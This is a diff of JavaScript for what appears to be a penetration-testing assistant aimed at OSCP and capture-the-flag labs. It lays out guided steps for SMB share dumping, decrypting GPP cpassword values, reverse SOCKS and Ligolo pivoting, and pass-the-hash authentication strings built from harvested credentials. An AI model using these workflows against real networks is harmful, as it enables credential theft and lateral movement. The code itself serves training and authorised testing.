+                  { title: 'Check Delegation & ADCS Templates (-M adcs -M maq)', sub: 'Checks constrained/unconstrained delegation, ADCS templates, and MachineAccountQuota.', cmdIndex: 6 },
+                  { title: 'Hunt Account Descriptions for Passwords (-M user-desc)', sub: 'Checks user description attributes for leaked credentials.', cmdIndex: 7 }
+                ]
+              },
+              {
+                id: 'ad-man-onhost',
+                label: 'On-Host Built-In & PowerView Sweep',
+                portLabel: 'In-Session',
+                steps: [
+                  { title: 'Built-In Groups, Privileges & Domain Admins', sub: 'Zero-upload check using native whoami and net commands.', cmdIndex: 15 },
+                  { title: 'PowerView Nested Groups & Outbound ACLs', sub: 'Finds nested group memberships and interesting ACL edges from a Windows shell.', cmdIndex: 12 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else if (id === 'smb-share-inventory' || id === 'gpp-passwords') {
+        var isGppMove = id === 'gpp-passwords';
+        launcherSub = 'Recursively list custom readable shares (e.g. Replication) and bulk-pull GPP XML files with smbclient before falling back to SYSVOL-only modules.';
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'folder',
+            label: 'SMB Share & GPP Discovery Lanes',
+            lanes: [
+              {
+                id: 'null-guest-share-gpp',
+                label: 'Null / Guest Recursive Share & GPP XML Decrypt',
+                portLabel: 'Port 445 · Null/Guest',
+                lockedWhen: function () { return !smbOpen; },
+                lockBadge: 'Port 445 Closed',
+                steps: isGppMove ? [
+                  { title: 'Recursively Dump Readable Share (smbclient -N)', sub: 'Downloads all readable files from custom shares like Replication without credentials.', cmdIndex: 0 },
+                  { title: 'Search Downloaded XMLs for cpassword (grep)', sub: 'Locates Groups.xml, Services.xml, and ScheduledTasks.xml containing cpassword.', cmdIndex: 1 },
+                  { title: 'Decrypt GPP cpassword Value (gpp-decrypt)', sub: 'Decrypts the AES-256 cpassword attribute into plaintext.', cmdIndex: 2 }
+                ] : [
+                  { title: 'Recursively List Custom Readable Share (smbclient -N)', sub: 'Walks custom shares like Replication without credentials (nxc -M gpp_password only checks SYSVOL by default).', cmdIndex: 0 },
+                  { title: 'Bulk-Download GPP XML Files (Groups.xml / Services.xml)', sub: 'Pulls Groups.xml, Services.xml, and ScheduledTasks.xml from any nested folder.', cmdIndex: 1 },
+                  { title: 'Decrypt GPP cpassword Value (gpp-decrypt)', sub: 'Decrypts the AES-256 cpassword attribute into plaintext.', cmdIndex: 7 }
+                ]
+              },
+              {
+                id: 'auth-share-spider',
+                label: 'Authenticated Share Spider & Recursive Listing',
+                portLabel: 'Port 445 · Auth',
+                lockedWhen: function () { return !smbOpen; },
+                lockBadge: 'Port 445 Closed',
+                steps: isGppMove ? [
+                  { title: 'Recursively Dump Share with Credentials (smbclient)', sub: 'Downloads all accessible files from the target share.', cmdIndex: 3 },
+                  { title: 'Search Downloaded XMLs for cpassword (grep)', sub: 'Locates cpassword attributes across downloaded GPP XML files.', cmdIndex: 1 },
+                  { title: 'Decrypt Discovered GPP cpassword', sub: 'Decrypts any discovered cpassword string.', cmdIndex: 2 }
+                ] : [
+                  { title: 'Recursively List Share with Credentials (smbclient)', sub: 'Lists all nested directories and files on the target share.', cmdIndex: 2 },
+                  { title: 'Spider All Readable Shares via NetExec (spider_plus)', sub: 'Catalogs readable files across every non-default SMB share.', cmdIndex: 3 },
+                  { title: 'Decrypt Discovered GPP cpassword', sub: 'Decrypts any discovered cpassword string.', cmdIndex: 7 }
+                ]
+              }
+            ]
+          }
+        ];
+      }
+    } else if (category === 'pivoting') {
+      launcherSub = 'Follow the ordered tunnel setup steps between Kali and your foothold host.';
+      if (id === 'ligolo-tunnel-pivot' || id === 'pivot-ligolo') {
+        var hasRouteStep = (action.commands || []).length >= 3;
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'zap',
+            label: 'Ligolo-ng Tunnel Sequence',
+            lanes: [
+              {
+                id: 'ligolo-chain',
+                label: 'Ligolo-ng TUN Interface + Route',
+                portLabel: 'TCP 11601',
+                steps: [
+                  { title: 'Step 1 (On Kali) · Create TUN Interface & Start Proxy', sub: 'Creates the ligolo TUN interface and starts ligolo-proxy listening on 11601.', cmdIndex: 0 },
+                  { title: 'Step 2 (On Foothold) · Connect Ligolo Agent to Kali', sub: 'Connects agent back to your Kali proxy.', cmdIndex: 1 }
+                ].concat(hasRouteStep ? [
+                  { title: 'Step 3 (On Kali) · Add Internal Subnet Route & Start Tunnel', sub: 'Routes internal subnet traffic through the ligolo interface.', cmdIndex: 2 }
+                ] : [])
+              }
+            ]
+          }
+        ];
+      } else if (id === 'pivot-chisel-socks') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'zap',
+            label: 'Chisel SOCKS5 Proxy Sequence',
+            lanes: [
+              {
+                id: 'chisel-chain',
+                label: 'Chisel Reverse SOCKS5 Tunnel',
+                portLabel: 'TCP 8080 -> 1080',
+                steps: [
+                  { title: 'Step 1 (On Kali) · Start Chisel Reverse Server', sub: 'Listens on port 8080 for incoming reverse tunnel connections.', cmdIndex: 0 },
+                  { title: 'Step 2 (On Foothold) · Connect Chisel Client (R:socks)', sub: 'Opens SOCKS5 proxy on Kali 127.0.0.1:1080 for proxychains.', cmdIndex: 1 }
+                ]
+              }
+            ]
+          }
+        ];
+      } else if (id === 'pivot-ssh-portforward') {
+        rawGroups = [
+          {
+            id: 'all',
+            icon: 'zap',
+            label: 'SSH Port Forwarding Mode',
+            lanes: [
+              {
+                id: 'ssh-local-fwd',
+                label: 'Local Port Forward (-L)',
+                portLabel: 'Reach Internal Service',
+                steps: [
+                  { title: 'Forward Local Kali Port Through SSH Foothold', sub: 'Binds a local port on Kali and forwards traffic to the internal host:port.', cmdIndex: 0 }
+                ]
+              },
+              {
+                id: 'ssh-remote-fwd',
+                label: 'Remote Port Forward (-R)',
+                portLabel: 'Expose Kali Listener',
+                steps: [
+                  { title: 'Expose Kali Listener Port on the Foothold Host', sub: 'Allows an isolated internal host to connect back to your Kali listener via the foothold.', cmdIndex: 1 }
+                ]
+              }
+            ]
+          }
+        ];
+      }
+    }
+
+    if (!rawGroups.length) return null;
+
+    // Evaluate steps and lanes
+    var groups = rawGroups.map(function (g) {
+      var evaluatedLanes = (g.lanes || []).map(function (l) {
+        var steps = (l.steps || []).map(function (s, idx) {
+          var cIdx = typeof s.cmdIndex === 'number' ? s.cmdIndex : 0;
+          var cmdObj = (action.commands || [])[cIdx] || {};
+          var fillObj = filled[cIdx] || {};
+          var filledStr = fillObj.filled || cmdObj.run || '';
+          var un = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.unfilledTokens === 'function')
+            ? root.OBOL.command.unfilledTokens(filledStr) : [];
+          var earnedMap = (root.OBOL && root.OBOL.command && root.OBOL.command.EARNED_TOKENS) || {};
+          var gated = !!(fillObj.blocked || un.some(function (t) { return !!earnedMap[t]; }));
+          var alreadyOpen = typeof s.alreadyOpenWhen === 'function' ? !!s.alreadyOpenWhen() : false;
+          var ranExact = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.commandRanExactOrSig === 'function')
+            ? root.OBOL.command.commandRanExactOrSig(filledStr, activities, params, target) : false;
+          var triedEpoch = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.commandTriedInEpoch === 'function')
+            ? root.OBOL.command.commandTriedInEpoch(action, cmdObj, filledStr, activities, epoch, target) : false;
+          var settled = (!s.ignoreSettled && cmdObj) ? commandSettled(cmdObj, facts) : false;
+          var customDone = typeof s.doneWhen === 'function' ? !!s.doneWhen() : false;
+          var directDone = customDone || settled || ranExact || triedEpoch;
+          return {
+            stepNum: idx + 1,
+            title: s.title || ('Step ' + (idx + 1)),
+            sub: s.sub || cmdObj.note || '',
+            cmdIndex: cIdx,
+            filled: filledStr,
+            tool: cmdObj.tool || action.tool || '',
+            locus: commandLocus(cmdObj),
+            directDone: directDone,
+            done: directDone || alreadyOpen,
+            implicitDone: false,
+            alreadyOpen: alreadyOpen,
+            alreadyOpenBadge: s.alreadyOpenBadge || 'Ready',
+            gated: gated,
+            unfilled: un
+          };
+        });
+
+        // Implicit Prerequisite Completion (A3b):
+        // If a later step in the same lane has completed (directDone), mark earlier setup/connect steps in this lane as done!
+        var highestDirectDone = -1;
+        for (var si = steps.length - 1; si >= 0; si--) {
+          if (steps[si].directDone) { highestDirectDone = si; break; }
+        }
+        for (var pi = 0; pi < highestDirectDone; pi++) {
+          if (!steps[pi].done) {
+            steps[pi].done = true;
+            steps[pi].implicitDone = true;
+          }
+        }
+        steps.forEach(function (st) {
+          st.needsPrevStepPaste = !st.done && !!st.gated;
+          if (st.alreadyOpen && !st.directDone && !st.implicitDone) {
+            st.statusBadge = st.alreadyOpenBadge;
+          } else if (st.done) {
+            st.statusBadge = 'Completed';
+          } else if (st.gated) {
+            st.statusBadge = 'Paste Prev Step First';
+          } else {
+            st.statusBadge = 'Step ' + st.stepNum + ' · Ready';
+          }
+        });
+
+        var laneDone = (typeof l.doneWhen === 'function' && l.doneWhen())
+          || (steps.length > 0 && steps[steps.length - 1].done && !steps[steps.length - 1].alreadyOpen);
+        var laneLocked = !laneDone && typeof l.lockedWhen === 'function' && !!l.lockedWhen();
+        var status = laneDone ? 'done' : (laneLocked ? 'locked' : 'ready');
+        var badge = laneDone ? 'Completed' : (laneLocked ? (l.lockBadge || l.lockReason || 'Locked') : (l.readyBadge || 'Ready'));
+        var badgeIcon = laneDone ? 'check' : (laneLocked ? 'lock' : 'check');
+
+        return {
+          id: l.id,
+          label: l.label,
+          portLabel: l.portLabel || '',
+          status: status,
+          badge: badge,
+          badgeIcon: badgeIcon,
+          lockReason: laneLocked ? (l.lockReason || '') : '',
+          steps: steps
+        };
+      });
+      return {
+        id: g.id,
+        icon: g.icon || 'zap',
+        label: g.label,
+        lanes: evaluatedLanes
+      };
+    });
+
+    // Resolve active group & lane selection from eng.ui.pathChooserSel[action.id] or smart default
+    var savedSel = (eng.ui && eng.ui.pathChooserSel && eng.ui.pathChooserSel[id]) || {};
+    var selectedGroup = groups.filter(function (g) { return g.id === savedSel.groupId; })[0];
+    if (!selectedGroup) {
+      if (id === 'flag-hunt-windows') {
+        var onHostGrp = groups.filter(function (g) { return g.id === 'onhost'; })[0];
+        var anyOnHostReady = onHostGrp && onHostGrp.lanes.some(function (l) { return l.status === 'ready'; });
+        selectedGroup = anyOnHostReady ? onHostGrp : groups[0];
+      } else {
+        selectedGroup = groups[0];
+      }
+    }
+    var selectedLane = (selectedGroup.lanes || []).filter(function (l) { return l.id === savedSel.laneId; })[0];
+    if (!selectedLane) {
+      selectedLane = (selectedGroup.lanes || []).filter(function (l) { return l.status === 'ready'; })[0]
+        || (selectedGroup.lanes || []).filter(function (l) { return l.status === 'done'; })[0]
+        || (selectedGroup.lanes || [])[0];
+    }
+
+    return {
+      actionId: id,
+      category: category,
+      launcherTitle: launcherTitle,
+      launcherSub: launcherSub,
+      needsBothFlagsOnHost: (id === 'flag-hunt-root-windows' || id === 'flag-hunt-root-linux') ? !!needsBothFlagsOnHost : false,
+      callout: callout,
+      groups: groups,
+      selectedGroupId: selectedGroup ? selectedGroup.id : '',
+      selectedLaneId: selectedLane ? selectedLane.id : '',
+      selectedGroup: selectedGroup || null,
+      selectedLane: selectedLane || null
+    };
+  }
+
+  function pcMakeLane(def, deckVariantSel) {
+    deckVariantSel = deckVariantSel || {};
+    var laneId = def.id;
+    var steps = (def.steps || []).map(function (st, idx) {
+      var stepId = st.id || ('step-' + (idx + 1));
+      var variants = Array.isArray(st.variants) ? st.variants.map(function (v) {
+        return {
+          id: v.id,
+          label: v.label || v.id,
+          tool: v.tool || st.tool || '',
+          locus: v.locus || st.locus || 'remote',
+          command: v.command || '',
+          note: v.note || st.note || '',
+          isEducatedGuess: v.isEducatedGuess,
+          verifiedPath: v.verifiedPath,
+          guessBadge: v.guessBadge
+        };
+      }) : undefined;
+      var savedVarId = deckVariantSel[laneId + ':' + stepId];
+      var chosenVar = null;
+      if (variants && variants.length) {
+        if (savedVarId) {
+          chosenVar = variants.filter(function (v) { return v.id === savedVarId; })[0];
+        }
+        if (!chosenVar && st.selectedVariantId) {
+          chosenVar = variants.filter(function (v) { return v.id === st.selectedVariantId; })[0];
+        }
+        if (!chosenVar) chosenVar = variants[0];
+      }
+      var resolvedCmd = chosenVar ? chosenVar.command : (st.command || '');
+      var resolvedTool = chosenVar ? (chosenVar.tool || st.tool || '') : (st.tool || '');
+      var resolvedLocus = chosenVar ? (chosenVar.locus || st.locus || 'remote') : (st.locus || 'remote');
+      var resolvedNote = (chosenVar && chosenVar.note) ? chosenVar.note : (st.note || '');
+      var resolvedIsGuess = (chosenVar && typeof chosenVar.isEducatedGuess === 'boolean')
+        ? chosenVar.isEducatedGuess
+        : !!st.isEducatedGuess;
+      var resolvedVerified = (chosenVar && typeof chosenVar.verifiedPath === 'boolean')
+        ? chosenVar.verifiedPath
+        : !!st.verifiedPath;
+      var resolvedGuessBadge = (chosenVar && chosenVar.guessBadge) || st.guessBadge || 'Educated Guess';
+      return {
+        stepNum: idx + 1,
+        id: stepId,
+        label: st.label || st.title || ('Step ' + (idx + 1)),
+        title: st.label || st.title || ('Step ' + (idx + 1)),
+        tool: resolvedTool,
+        locus: resolvedLocus,
+        command: resolvedCmd,
+        filled: resolvedCmd,
+        note: resolvedNote,
+        sub: resolvedNote,
+        done: !!st.done,
+        needsPrevStepPaste: !!st.needsPrevStepPaste && !st.done,
+        isEducatedGuess: resolvedIsGuess && !st.done,
+        verifiedPath: resolvedVerified && !st.done,
+        guessBadge: resolvedGuessBadge,
+        variantLabel: st.variantLabel || 'Tool:',
+        variants: variants,
+        selectedVariantId: chosenVar ? chosenVar.id : (st.selectedVariantId || ''),
+        paramGroups: Array.isArray(st.paramGroups) ? st.paramGroups : [],
+        fillInputs: Array.isArray(st.fillInputs) ? st.fillInputs : []
+      };
+    });
+
+    var highestDone = -1;
+    for (var si = steps.length - 1; si >= 0; si--) {
+      if (steps[si].done) { highestDone = si; break; }
+    }
+    for (var pi = 0; pi < highestDone; pi++) {
+      steps[pi].done = true;
+      steps[pi].needsPrevStepPaste = false;
+      steps[pi].isEducatedGuess = false;
+    }
+
+    var isLocked = !!def.locked;
+    var allDone = !isLocked && (!!def.done || (steps.length > 0 && steps.every(function (s) { return !!s.done; })));
+    var status = isLocked ? 'locked' : 'ready';
+    var lockReason = isLocked ? (def.lockReason || 'Locked') : '';
+    function shortLockBadge(r) {
+      if (!r) return 'Locked';
+      if (/scan|nmap/i.test(r)) return 'Needs Scan';
+      if (/5985.*3389|ports.*closed/i.test(r)) return 'Ports Closed';
+      if (/5985/i.test(r)) return 'Port 5985 Off';
+      if (/3389/i.test(r)) return 'Port 3389 Off';
+      if (/445/i.test(r)) return 'Port 445 Off';
+      if (/\b22\b/i.test(r)) return 'Port 22 Off';
+      if (/domain controller|\bad\b|88|389|ldap|kerberos/i.test(r)) return 'Needs AD / DC';
+      if (/admin|root|privilege|dacl|writable/i.test(r)) return 'Needs Admin';
+      if (/share/i.test(r)) return 'Needs Share';
+      if (/cred|auth/i.test(r)) return 'Needs Creds';
+      if (/shell|on-host/i.test(r)) return 'Needs Shell';
+      if (r.length <= 13) return r;
+      return r.split(/\s*[(:·-]\s*/)[0].slice(0, 13);
+    }
+    var badge = isLocked ? (def.lockBadge || shortLockBadge(lockReason)) : (allDone ? 'Done' : 'Ready');
+    var badgeIcon = isLocked ? 'lock' : 'check';
+
+    return {
+      id: laneId,
+      actionId: def.actionId || '',
+      title: def.title,
+      label: def.title,
+      sub: def.sub || '',
+      portLabel: def.portLabel || def.sub || '',
+      status: status,
+      done: allDone,
+      badge: badge,
+      badgeIcon: badgeIcon,
+      lockReason: lockReason,
+      steps: steps
+    };
+  }
+
+  function buildDeck(facts, params, eng, opts) {
+    eng = eng || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.active === 'function') ? root.OBOL.store.active() : null) || {};
+    params = params || eng.params || {};
+    facts = facts || ((root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function') ? root.OBOL.store.factSet() : null);
+    opts = opts || {};
+
+    var ctx = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.buildContext === 'function')
+      ? root.OBOL.command.buildContext(facts, { params: params, profile: eng.profile })
+      : (params || {});
+
+    var allFacts = (root.OBOL && root.OBOL.store && typeof root.OBOL.store.factSet === 'function')
+      ? root.OBOL.store.factSet()
+      : facts;
+    function hasFact(k) { return !!(facts && typeof facts.has === 'function' && facts.has(k)); }
+    function factVals(k) { return (facts && typeof facts.values === 'function') ? (facts.values(k) || []) : []; }
+    function hasAnyFact(k) { return hasFact(k) || !!(allFacts && typeof allFacts.has === 'function' && allFacts.has(k)); }
+    function allFactVals(k) {
+      var local = factVals(k);
+      var global = (allFacts && allFacts !== facts && typeof allFacts.values === 'function') ? (allFacts.values(k) || []) : [];
+      return local.concat(global);
+    }
+
+    var openPorts = (root.OBOL && root.OBOL.command && typeof root.OBOL.command.openPorts === 'function' && facts)
+      ? root.OBOL.command.openPorts(facts) : [];
+    var hasPortScan = openPorts.length > 0;
+    function isPortOpen(p) {
+      if (hasFact('port:' + p)) return true;
+      if (openPorts.indexOf(p) >= 0) return true;
+      return false;
+    }
+
+    var target = params.target || ctx.target || '{{target}}';
+    var domain = params.domain || (ctx.domain && ctx.domain.indexOf('<') < 0 ? ctx.domain : '') || '';
+    var authRealm = params.authRealm || params.auth_realm || (ctx.authRealm && ctx.authRealm.indexOf('<') < 0 ? ctx.authRealm : '') || (ctx.auth_realm && ctx.auth_realm.indexOf('<') < 0 ? ctx.auth_realm : '') || '';
+    var explicitUser = params.user || params.username || '';
+    var user = explicitUser || (ctx.user && ctx.user.indexOf('<') < 0 ? ctx.user : '') || (ctx.username && ctx.username.indexOf('<') < 0 ? ctx.username : '') || '';
+    var password = params.password || '';
+    var nthash = params.nthash || '';
+    var dahash = params.dahash || (ctx.dahash && ctx.dahash.indexOf('<') < 0 ? ctx.dahash : '') || '';
+    var lhost = params.lhost || ctx.lhost || '{{lhost}}';
+    var lport = params.lport || ctx.lport || '4444';
+
+    var credsAvail = factVals('credential.available');
+    var credsPlain = factVals('credential.plaintext');
+    var credsPass = credsPlain.concat(factVals('credential.password')).concat(credsAvail.filter(function (c) { return c && (c.password || c.secret); }));
+    var credsHash = factVals('credential.ntlm_hash').concat(factVals('hash.ntlm')).concat(factVals('credential.nthash')).concat(credsAvail.filter(function (c) { return c && (c.nthash || c.hash || c.ntlm); }));
+    if (!user) {
+      var firstCred = credsPass[0] || credsHash[0] || credsAvail[0];
+      if (firstCred && (firstCred.username || firstCred.user)) user = firstCred.username || firstCred.user;
+      if (!domain && firstCred && firstCred.domain) domain = firstCred.domain;
+    }
+    if (!password && credsPass.length) {
+      var matchPass = user
+        ? credsPass.filter(function (c) { return String(c.username || c.user || '').toLowerCase() === String(user).toLowerCase(); })[0]
+        : credsPass[0];
+      if (matchPass && (matchPass.password || matchPass.secret)) password = matchPass.password || matchPass.secret;
+    }
+    if (!nthash && credsHash.length) {
+      var matchHash = user
+        ? credsHash.filter(function (c) { return String(c.username || c.user || '').toLowerCase() === String(user).toLowerCase(); })[0]
+        : credsHash[0];
+      if (matchHash && (matchHash.nthash || matchHash.hash || matchHash.ntlm)) nthash = matchHash.nthash || matchHash.hash || matchHash.ntlm;
+    }
+    if (!password && !nthash && !explicitUser) {
+      if (ctx.password && ctx.password.indexOf('<') < 0) password = ctx.password;
+      if (ctx.nthash && ctx.nthash.indexOf('<') < 0) nthash = ctx.nthash;
+    }
+    if (nthash && nthash.indexOf(':') >= 0) nthash = nthash.split(':').pop();
+    if (dahash && dahash.indexOf(':') >= 0) dahash = dahash.split(':').pop();
+
+    var hasCred = !!(user && (password || nthash || dahash))
+      || hasFact('credential.available') || hasFact('credential.plaintext') || hasFact('credential.password') || hasFact('credential.ntlm_hash') || hasFact('hash.ntlm') || hasFact('credential.nthash') || hasFact('credential.validated');
+    var anyAdminFact = hasFact('access.admin') || hasFact('access.system') || hasFact('access.root') || hasFact('access.admin_shell') || !!dahash;
+    var adminFactUsers = factVals('access.admin').concat(factVals('access.system')).map(function (v) {
+      var raw = v && (v.username || v.user || v.identity) ? String(v.username || v.user || v.identity).trim() : '';
+      return raw.replace(/^.*[\\\/]/, '').replace(/@.*$/, '').toLowerCase();
+    }).filter(Boolean);
+    var userLower = String(user || '').replace(/^.*[\\\/]/, '').replace(/@.*$/, '').toLowerCase();
+    var isSelectedUserAdmin = user
+      ? ((hasCred && /^(administrator|admin|root|system|obol)$/i.test(userLower)) || adminFactUsers.indexOf(userLower) >= 0 || (adminFactUsers.length === 0 && anyAdminFact))
+      : anyAdminFact;
+    var isAdmin = isSelectedUserAdmin;
+    var hasRoot = hasFact('access.root') || isAdmin;
+    var activeUser = (isAdmin && dahash && !user) ? 'Administrator' : (user || '{{user}}');
+    var activeHash = (isAdmin && dahash && !nthash) ? dahash : nthash;
+    var useHashAuth = !!(activeHash && !password);
+    var secretKind = password ? 'password' : (activeHash ? 'nthash' : (hasCred ? 'credential' : 'none'));
+    var effAuthDomain = authRealm || domain || '';
+    var resolvedCred = facts && facts._resolvedContext && facts._resolvedContext.credential;
+    var isLocalAuthRealm = !!(
+      (resolvedCred && resolvedCred.accountType === 'local')
+      || (authRealm && (
+        authRealm === '.'
+        || (domain && authRealm.toLowerCase() !== domain.toLowerCase() && authRealm.toLowerCase() !== domain.toLowerCase().split('.')[0] && authRealm.indexOf('.') < 0)
+      ))
+    );
+    var domPrefix = effAuthDomain ? (effAuthDomain + '/') : '';
+    var activeIdentity = {
+      username: user || (isAdmin && dahash ? 'Administrator' : ''),
+      domain: effAuthDomain || '',
+      secretKind: secretKind,
+      isAdmin: isAdmin,
+      label: (user || (isAdmin && dahash ? 'Administrator' : ''))
+        ? ((effAuthDomain ? (effAuthDomain + '\\') : '') + (user || 'Administrator') + ' (' + (isAdmin ? 'Admin · ' : '') + secretKind + ')')
+        : 'Unauthenticated / Null Session'
+    };
+
+    var hasSmb = isPortOpen(445) || isPortOpen(139) || hasFact('service.smb') || hasFact('smb.reachable') || hasFact('smb.authenticated') || hasFact('smb.shares') || hasFact('smb.readable_share');
+    var hasWinrm = hasFact('port:5985') || hasFact('port:5986') || openPorts.indexOf(5985) >= 0 || openPorts.indexOf(5986) >= 0 || hasFact('service.winrm') || hasFact('winrm.reachable') || hasFact('host.winrm_enabled') || hasFact('winrm.authenticated');
+    var hasRdp = hasFact('port:3389') || openPorts.indexOf(3389) >= 0 || hasFact('service.rdp') || hasFact('rdp.reachable') || hasFact('host.rdp_enabled') || hasFact('rdp.authenticated');
+    var hasSsh = isPortOpen(22) || hasFact('service.ssh') || hasFact('ssh.reachable') || hasFact('ssh.authenticated');
+    var hasLdap = isPortOpen(389) || isPortOpen(636) || isPortOpen(3268) || isPortOpen(3269) || hasFact('ldap.reachable') || hasFact('service.ldap') || hasFact('ad.anonymous_bind') || hasFact('ldap.authenticated');
+    var isDc = hasLdap || isPortOpen(88) || hasFact('kerberos.reachable') || hasFact('ad.dc_candidate') || hasFact('service.kerberos') || hasFact('ad.dc');
+
+    var hasTgsHash = hasAnyFact('hash.tgs') || hasAnyFact('kerberos.tgs_hash');
+    var hasAsrepHash = hasAnyFact('hash.asrep') || hasAnyFact('kerberos.asrep_hash');
+    var hasUserList = hasAnyFact('ad.user_list') || hasAnyFact('ad.users') || hasAnyFact('smb.users');
+    var hasAclLead = hasFact('ad.acl_abuse') || hasFact('ad.acl_lead') || hasFact('ad.control_paths') || hasFact('ad.attack_paths') || hasFact('ad.acl_writable');
+    var hasForceChangePw = hasFact('ad.ForceChangePassword') || factVals('ad.acl_abuse').some(function (v) { return v && /ForceChangePassword|AllExtendedRights|GenericAll|GenericWrite/i.test(String(v.right || v.rights || '')); });
+    var hasBhCollected = hasAnyFact('ad.graph.collected') || hasAnyFact('ad.bloodhound_collected') || hasAnyFact('ad.control_paths') || hasAnyFact('ad.attack_paths');
+    var hasDcsyncRights = hasFact('ad.domain_control') || hasFact('ad.dcsync_rights');
+    var hasGppXml = hasAnyFact('loot.gpp') || hasAnyFact('ad.gpp_xml') || hasAnyFact('smb.gpp_xml_found') || allFactVals('config.review').some(function (v) { return v && v.kind === 'gpp_xml'; });
+    var gppCpassCand = allFactVals('credential.candidate').filter(function (v) { return v && (v.kind === 'gpp_cpassword' || v.kind === 'gpp_plaintext'); });
+    var hasGppCpass = hasAnyFact('ad.gpp_cpassword') || hasAnyFact('vuln.gpp_cpassword') || gppCpassCand.length > 0;
+    var gppCpassVal = (gppCpassCand.filter(function (v) { return v.cpassword || v.secret || v.value; })[0] || {}).cpassword
+      || (gppCpassCand[0] && (gppCpassCand[0].secret || gppCpassCand[0].value))
+      || ctx.cpassword
+      || '{{cpassword}}';
+    var tgsUsers = allFactVals('hash.tgs').map(function (v) { return v && (v.username || v.user) ? String(v.username || v.user).toLowerCase() : ''; }).filter(Boolean);
+    var asrepUsers = allFactVals('hash.asrep').map(function (v) { return v && (v.username || v.user) ? String(v.username || v.user).toLowerCase() : ''; }).filter(Boolean);
+    var allPlainCreds = allFactVals('credential.plaintext').concat(allFactVals('credential.password'));
+    var crackedPlainUsers = allPlainCreds.map(function (v) { return v && (v.username || v.user) ? String(v.username || v.user).toLowerCase() : ''; }).filter(Boolean);
+    var tgsCracked = hasTgsHash && (hasAnyFact('credential.cracked') || tgsUsers.some(function (u) { return crackedPlainUsers.indexOf(u) >= 0; }));
+    var asrepCracked = hasAsrepHash && (hasAnyFact('credential.cracked') || asrepUsers.some(function (u) { return crackedPlainUsers.indexOf(u) >= 0; }));
+
+    var isLinux = hasFact('os.linux') || hasFact('foothold.linux') || (hasSsh && !hasSmb && !hasWinrm && !hasRdp && hasPortScan);
+    var isWindows = hasFact('os.windows') || hasFact('foothold.windows') || hasSmb || hasWinrm || hasRdp || !isLinux;
+    var isLinuxOnly = isLinux && !hasFact('os.windows') && !hasFact('foothold.windows') && !hasWinrm && !hasLdap;
+
+    var hasWinShell = hasFact('foothold.windows') || hasFact('access.desktop') || hasFact('access.admin_shell') || (hasFact('access.shell') && !isLinuxOnly);
+    var hasLinShell = hasFact('foothold.linux') || (hasFact('access.shell') && isLinux) || hasFact('access.root');
+    var hasShell = hasWinShell || hasLinShell || hasFact('access.shell');
+
+    var readableShares = factVals('smb.readable_share').map(function (s) {
+      return typeof s === 'string' ? s : (s && (s.share || s.name || s.value) ? (s.share || s.name || s.value) : '');
+    }).filter(Boolean);
+    var customShares = readableShares.filter(function (s) {
+      return !/^(IPC\$|ADMIN\$|C\$|PRINT\$)$/i.test(s);
+    });
+    var hasReadableShare = readableShares.length > 0 || hasFact('smb.shares') || hasFact('smb.null_session');
+    var chosenShare = customShares.filter(function (s) { return !/^(SYSVOL|NETLOGON|Users)$/i.test(s); })[0]
+      || customShares[0] || params.share || (ctx.share && ctx.share.indexOf('<') < 0 ? ctx.share : '') || 'SYSVOL';
+
+    var unlocked = !!(hasCred || hasReadableShare || hasShell || isAdmin);
+
+    var localFlagCaptured = hasFact('objective.local_flag');
+    var rootFlagCaptured = hasFact('objective.root_flag');
+    var localFlagOnHost = factVals('objective.local_flag').some(function (v) { return v && v.on_host === true; });
+    var rootFlagOnHost = factVals('objective.root_flag').some(function (v) { return v && v.on_host === true; });
+
+    var locatedFlags = factVals('objective.flag_located');
+    var localLocObj = factVals('objective.flag_located_local').filter(function (v) { return v && v.path; })[0]
+      || locatedFlags.filter(function (v) { return v && (v.slot === 'local' || v.slot === 'user') && v.path; })[0];
+    var rootLocObj = factVals('objective.flag_located_root').filter(function (v) { return v && v.path; })[0]
+      || locatedFlags.filter(function (v) { return v && v.slot === 'root' && v.path; })[0];
+    var hasVerifiedLocalPath = hasFact('objective.flag_located_local') || !!(localLocObj && localLocObj.path) || !!(ctx.flag_path_local && ctx.flag_path_local.indexOf('{{') < 0);
+    var hasVerifiedRootPath = hasFact('objective.flag_located_root') || !!(rootLocObj && rootLocObj.path) || !!(ctx.flag_path_root && ctx.flag_path_root.indexOf('{{') < 0);
+    var isOscpScope = !!(eng && ((eng.ui && /oscp/i.test(eng.ui.lens || '')) || (eng.profile && /oscp|pwk|offsec/i.test(eng.profile.platform || ''))));
+    var defaultLocalFlagName = isOscpScope ? 'local.txt' : 'user.txt';
+    var defaultRootFlagName = isOscpScope ? 'proof.txt' : 'root.txt';
+    var userFlagWinPath = (localLocObj && localLocObj.path) || (ctx.flag_path_local && ctx.flag_path_local.indexOf('{{') < 0 ? ctx.flag_path_local : '') || ('C:\\Users\\' + (user || 'Public') + '\\Desktop\\' + defaultLocalFlagName);
+    var rootFlagWinPath = (rootLocObj && rootLocObj.path) || (ctx.flag_path_root && ctx.flag_path_root.indexOf('{{') < 0 ? ctx.flag_path_root : '') || ('C:\\Users\\Administrator\\Desktop\\' + defaultRootFlagName);
+    var userShareRelPath = userFlagWinPath.replace(/^[A-Za-z]:\\Users\\/i, '').replace(/^[\\\/]+/, '');
+
+    var localFlagCapturedRemotely = !!(localFlagCaptured && !localFlagOnHost);
+    var needsBothFlagsOnHost = (!localFlagOnHost) && (isAdmin || hasRoot || localFlagCapturedRemotely);
+
+    var nxcBaseAuth = useHashAuth
+      ? ("-u '" + activeUser + "' -H '" + activeHash + "'")
+      : ("-u '" + activeUser + "' -p '" + (password || '{{password}}') + "'");
+    var nxcAuth = nxcBaseAuth + (isLocalAuthRealm ? ' --local-auth' : '');
+    var smbClientAuth = useHashAuth
+      ? ("-U '" + domPrefix + activeUser + "%" + activeHash + "' --pw-nt-hash")
+      : ("-U '" + domPrefix + activeUser + "%" + (password || '{{password}}') + "'");
+    var smbmapAuth = useHashAuth
+      ? ("-u '" + activeUser + "' -p 'aad3b435b51404eeaad3b435b51404ee:" + activeHash + "'")
